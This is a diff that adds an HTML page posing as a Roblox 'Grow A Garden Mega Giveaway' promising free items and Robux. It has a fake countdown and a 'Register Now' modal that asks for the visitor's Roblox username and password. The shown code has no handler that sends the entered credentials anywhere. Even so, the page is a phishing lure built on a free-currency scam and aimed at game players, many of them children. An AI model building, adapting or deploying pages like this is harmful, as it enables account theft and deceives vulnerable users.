@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en" class="min-h-screen">
+  <head>
+    <meta charset="UTF-8" />
+    <title>🎮 Roblox Exclusive Giveaway | ThroneConqueror</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+      body {
+        background: url('https://tr.rbxcdn.com/180DAY-c010566cf71816eb7b727ecf935d6e67/768/432/Image/Webp/noFilter') no-repeat center center;
+        background-size: cover;
+      }
+      #realTimeClock {
+        font-weight: bold;
+        font-size: 2rem;
+      }
+    </style>
+  </head>
+
+  <body class="relative min-h-screen flex flex-col items-center justify-center text-center px-4">
+
+    <!-- Dark overlay -->
+    <div class="absolute inset-0 bg-black bg-opacity-50 z-0"></div>
+
+    <!-- Main content container -->
+    <main class="relative z-10 flex flex-col items-center justify-center space-y-6">
+
+      <h1 class="text-4xl md:text-5xl font-extrabold text-yellow-400">🎮 Grow A Garden Mega Giveaway!</h1>
+      <p class="text-white max-w-md">Limited-time event! Claim exclusive Roblox items and Robux — just for fun & learning. 🕹️✨</p>
+
+      <!-- Countdown -->
+      <div class="bg-white rounded-xl p-4 shadow-lg w-full max-w-xs">
+        <p class="text-lg text-gray-800 mb-2">Giveaway starts in:</p>
+        <div id="realTimeClock" class="text-black text-3xl font-extrabold"></div>
+      </div>
+
+      <!-- Buttons -->
+      <div class="flex flex-col space-y-4 w-full max-w-xs">
+        <a href="https://www.roblox.com/games/126884695634066/Grow-a-Garden" 
+           target="_blank"
+           class="bg-blue-500 hover:bg-blue-600 text-white font-bold px-8 py-4 rounded-full text-lg shadow-lg transition-all w-full">
+          🔗 Launch Now
+        </a>
+        <button onclick="showLogin()"
+           class="bg-green-500 hover:bg-green-600 text-white font-bold px-8 py-4 rounded-full text-lg shadow-lg transition-all w-full">
+          🚀 Register Now
+        </button>
+      </div>
+
+<!-- Social Media Links: YouTube, Discord, TikTok -->
+      <div class="flex space-x-6 mt-8 justify-center">
+        <!-- YouTube -->
+        <a
+          href="https://www.youtube.com/@zeoranking"
+          target="_blank"
+          aria-label="YouTube"
+          class="text-red-600 hover:text-red-800 text-3xl"
+        >
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            class="w-8 h-8"
+            fill="currentColor"
+            viewBox="0 0 24 24"
+          >
+            <path
+              d="M19.615 3.184C18.403 2.738 12 2.738 12 2.738s-6.403 0-7.615.446C2.77 3.63 2 5.19 2 8.4v7.2c0 3.21.77 4.77 2.385 5.216C5.597 21.262 12 21.262 12 21.262s6.403 0 7.615-.446C21.23 20.37 22 18.81 22 15.6V8.4c0-3.21-.77-4.77-2.385-5.216zM10 15.5v-7l6 3.5-6 3.5z"
+            />
+          </svg>
+        </a>
+
+        <!-- Discord -->
+        <a
+          href="https://discord.com/invite/tilmamaproud"
+          target="_blank"
+          aria-label="Discord"
+          class="text-indigo-600 hover:text-indigo-800 text-3xl"
+        >
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            class="w-8 h-8"
+            fill="currentColor"
+            viewBox="0 0 24 24"
+          >
+            <path
+              d="M20.317 4.369A19.791 19.791 0 0016.885 3c-.214.369-.457.843-.628 1.228-1.825-.274-3.66-.274-5.486 0-.17-.385-.414-.86-.628-1.228a19.791 19.791 0 00-3.432 1.369c-2.203 3.3-2.803 6.518-2.494 9.68a19.985 19.985 0 005.946 3.03c.457-.617.86-1.271 1.203-1.97a12.29 12.29 0 01-1.885-.886c.157-.114.314-.229.457-.343 3.66 1.711 7.624 1.711 11.271 0 .143.114.3.229.457.343-.6.343-1.228.629-1.885.886.343.7.746 1.353 1.203 1.97a19.985 19.985 0 005.946-3.03c.309-3.162-.291-6.38-2.494-9.68zM8.02 14.287c-.943 0-1.7-.872-1.7-1.936 0-1.063.743-1.936 1.7-1.936s1.7.872 1.7 1.936c0 1.063-.743 1.936-1.7 1.936zm7.963 0c-.943 0-1.7-.872-1.7-1.936 0-1.063.743-1.936 1.7-1.936s1.7.872 1.7 1.936c0 1.063-.743 1.936-1.7 1.936z"
+            />
+          </svg>
+        </a>
+
+        <!-- TikTok -->
+        <a
+          href="https://www.tiktok.com/@jandelofficialacc"
+          target="_blank"
+          aria-label="TikTok"
+          class="text-black hover:text-gray-700 text-3xl"
+        >
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            class="w-8 h-8"
+            fill="currentColor"
+            viewBox="0 0 24 24"
+          >
+            <path
+              d="M12.63 2c1.04 0 1.89.85 1.89 1.89v10.42c0 2.33-1.89 4.22-4.22 4.22-2.33 0-4.22-1.89-4.22-4.22s1.89-4.22 4.22-4.22c.1 0 .19 0 .28.01V8.9c-.09-.01-.18-.01-.28-.01-3.46 0-6.27 2.81-6.27 6.27s2.81 6.27 6.27 6.27 6.27-2.81 6.27-6.27V7.08c.73.48 1.58.8 2.5.8V5.42c-.85 0-1.6-.26-2.23-.7A4.22 4.22 0 0012.63 2z"
+            />
+          </svg>
+        </a>
+      </div>
+    </div>
+
+    </main>
+
+    <!-- Login Modal -->
+    <div id="loginModal" class="hidden fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50">
+      <div class="bg-white p-8 rounded-lg shadow-lg max-w-md w-full text-center">
+        <h2 class="text-2xl font-bold mb-4">🔑 Login to Register</h2>
+        <p class="mb-4 text-gray-700">Please enter your Roblox username and password.</p>
+        <form id="loginForm" class="space-y-4 text-left">
+          <input type="text" id="username" placeholder="Username" required class="w-full px-4 py-3 border rounded">
+          <input type="password" id="password" placeholder="Password" required class="w-full px-4 py-3 border rounded">
+          <p id="errorMessage" class="text-red-500 text-sm hidden"></p>
+          <button type="submit" class="w-full bg-green-500 text-white py-3 rounded font-bold">Login</button>
+        </form>
+        <button onclick="closeModal()" class="mt-4 px-4 py-2 bg-red-500 text-white rounded">Close</button>
+      </div>
+    </div>
+
+    <!-- Countdown script -->
+    <script>
+      let countdownTime = .3 * 60 * 60;
+      const clock = document.getElementById("realTimeClock");
+      function updateCountdown() {
+        let hours = Math.floor(countdownTime / 3600);
+        let minutes = Math.floor((countdownTime % 3600) / 60);
+        let seconds = countdownTime % 60;
+        clock.textContent = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+        if (countdownTime > 0) {
+          countdownTime--;
+        } else {
+          clearInterval(timerInterval);
+          clock.textContent = "STARTED";
+        }
+      }
+      updateCountdown();
+      const timerInterval = setInterval(updateCountdown, 1000);
+
+      function showLogin() {
+        document.getElementById('loginModal').classList.remove('hidden');
+      }
+      function closeModal() {
+        document.getElementById('loginModal').classList.add('hidden');
+      }
+    </script>
+
+  </body>
+</html>
